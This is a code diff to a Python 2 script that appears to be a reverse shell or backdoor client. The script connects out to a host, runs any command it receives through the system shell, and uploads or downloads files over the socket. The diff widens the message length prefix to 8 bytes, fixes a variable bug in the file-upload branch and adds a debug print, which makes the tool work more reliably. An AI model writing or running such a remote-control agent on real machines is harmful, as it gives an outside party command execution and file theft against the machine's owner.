@@ -21,25 +21,29 @@ else:
 
 
 def grab(file_name):
-    file_string = open(file_name, "rb").read()
+    read_file =  open(file_name, "rb")
+
+    file_string = read_file.read()
+    read_file.close()
     file_size = len(file_string)
-    return struct.pack('>I', file_size) +  file_string
+    return struct.pack('>Q', file_size) +  file_string
 
 def get_file(sock):
-    full_message = recvall(sock, 4)
+    full_message = recvall(sock, 8)
+    print full_message
     if not full_message:
         return None
-    mess_length = struct.unpack('>I', full_message)[0]
+    mess_length = struct.unpack('>Q', full_message)[0]
     return recvall(sock, mess_length)
 
 def recvall(sock, n):
-    data = ''
-    while len(data) < n:
-        piece = sock.recv(n - len(data))
+    dat = ''
+    while len(dat) < n:
+        piece = sock.recv(n - len(dat))
         if not piece:
             return None
-        data += piece
-    return data
+        dat += piece
+    return dat
 
 
 def open_connection(host, port):
@@ -64,8 +68,8 @@ if __name__ == "__main__":
             if data.split()[0] == "grab":
                 out = grab(data.split()[1])
             elif data.split()[0] == "put":
-                data = get_file(conn)
-                open(command.split()[1], "wb").write(data)
+                message = get_file(conn)
+                open(data.split()[1], "wb").write(message)
                 out = 'Success'
             else:
                 out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
